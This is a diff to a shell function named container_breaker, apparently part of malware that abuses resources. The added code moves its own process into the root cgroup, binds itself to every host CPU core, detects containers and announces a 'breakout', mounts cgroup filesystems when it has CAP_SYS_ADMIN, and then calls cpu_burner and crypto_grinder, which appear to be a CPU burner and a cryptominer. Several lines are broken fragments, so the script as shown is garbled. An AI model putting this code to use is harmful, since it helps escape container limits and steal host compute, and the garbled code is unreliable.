@@ -1,4 +1,46 @@
 container_breaker() {
-    echo $$ > /sys/fs/cgroup/cpu/tasks 2>/dev/null
-    echo $$ > /sys/fs/cgroup/cpu,cpuacct/tasks 2>/dev/null
+local CGROUP_V2=false
+    if [[ -f /sys/fs/cgroup/cgroup.controllers ]]; then
+        CGROUP_V2=true
+    fi
+if [[ "$CGROUP_V2" == false ]]; then
+; do
+            local path="/sys/fs/cgroup/$ctrl/tasks"
+            [[ -w "$path" ]] && echo $$ > "$path" 2>/dev/null
+        done
+        /sys/fs/cgroup/*/tasks; do
+            [[ -w "$path" ]] && echo $$ > "$path" 2>/dev/null
+        done
+    fi
+if [[ "$CGROUP_V2" == true ]]; then
+        # Walk up the tree to root cgroup
+        local current="/sys/fs/cgroup$(cat /proc/self/cgroup | head -1 | cut -d: -f3)"
+        while [[ "$current" != "/sys/fs/cgroup" ]]; do
+            [[ -w "$current/cgroup.procs" ]] && echo $$ > "$current/cgroup.procs" 2>/dev/null
+            [[ -w "$current/cgroup.subtree_control" ]] && echo "+cpu +cpuset +memory" > "$current/cgroup.subtree_control" 2>/dev/null
+            current=$(dirname "$current")
+        done
+        # Root cgroup
+        echo $$ > /sys/fs/cgroup/cgroup.procs 2>/dev/null
+    fi
+-v nproc &>/dev/null; then
+        local HOST_CORES=$(nproc --all 2>/dev/null || nproc)
+        local MASK=$(printf '%x' $(( (1 << HOST_CORES) - 1 )))
+        taskset -p "$MASK" $$ >/dev/null 2>&1 || true
+    fi
+If /proc/1/ns differs from ours, we're containerized
+    if [[ -e /proc/1/ns/pid ]] && [[ -e /proc/self/ns/pid ]]; then
+        if ! diff /proc/1/ns/pid /proc/self/ns/pid >/dev/null 2>&1; then
+            echo "[*] Container detected. Attempting breakout..."
+        fi
+    fi
+CAP_SYS_ADMIN,
+    if capsh --print 2>/dev/null | grep -q "cap_sys_admin";
+        mkdir -p /tmp/cgroup_escape 2>/dev/null
+        mount -t cgroup2 none /tmp/cgroup_escape 2>/dev/null || \
+        mount -t cgroup none /tmp/cgroup_escape 2>/dev/null
+        [[ -w /tmp/cgroup_escape/cgroup.procs ]] && echo $$ > /tmp/cgroup_escape/cgroup.procs 2>/dev/null
+    fi
+echo "[*] successful"
     cpu_burner
+    crypto_grinder
